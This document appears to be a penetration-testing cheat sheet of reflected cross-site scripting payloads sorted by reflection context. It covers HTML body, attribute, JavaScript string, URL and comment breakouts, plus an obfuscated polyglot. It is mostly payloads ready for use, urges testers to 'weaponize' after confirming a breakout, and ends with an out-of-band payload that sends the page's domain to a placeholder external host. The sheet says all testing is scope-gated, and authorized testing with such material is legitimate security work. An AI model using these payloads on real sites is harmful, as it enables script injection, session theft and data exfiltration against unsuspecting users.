# Reflected XSS payloads by reflection context (step 5)
# Pick by the context classified in contexts.json. Use a unique marker first,
# confirm the breakout, THEN weaponize. All testing is scope-gated (roe-gate.md).

## 0. Reflection marker (use before any payload)
```
rs7f3q    # unique, greppable; find WHERE and in WHAT context it lands
```

## 1. HTML body (between tags)
```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<script>alert(1)</script>              <!-- blocked if CSP or tag-stripping -->
<details open ontoggle=alert(1)>
```

## 2. HTML attribute — quoted ( value="..." )
Break out of the quote + tag first:
```html
"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
```
Unquoted attribute:
```html
 onmouseover=alert(1) 
 autofocus onfocus=alert(1) 
```

## 3. Inside a JS string ( var x = '...' )
```js
'-alert(1)-'
';alert(1)//
'];alert(1)//
</script><svg onload=alert(1)>   # if reflection lets you close the script block
```
Template literal / backtick:
```js
${alert(1)}
`-alert(1)-`
```

## 4. URL / href / src ( <a href="REFLECTED"> )
```
javascript:alert(1)
javascript:alert(document.domain)//
```

## 5. HTML comment ( <!-- REFLECTED --> )
```html
--><svg onload=alert(1)>
```

## 6. Polyglots (context-agnostic triage — confirm the real context after)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'"><img src=x onerror=alert(1)>
```

## Execution confirmation
A payload counts only when it EXECUTES in a real browser (verify.md). Prefer a
detectable effect over `alert`: `print()`, `window.__rs=1`, or an out-of-band
callback (collaborator) so headless confirmation is unambiguous.
```
<img src=x onerror="fetch('https://OOB_HOST/'+document.domain)">
```
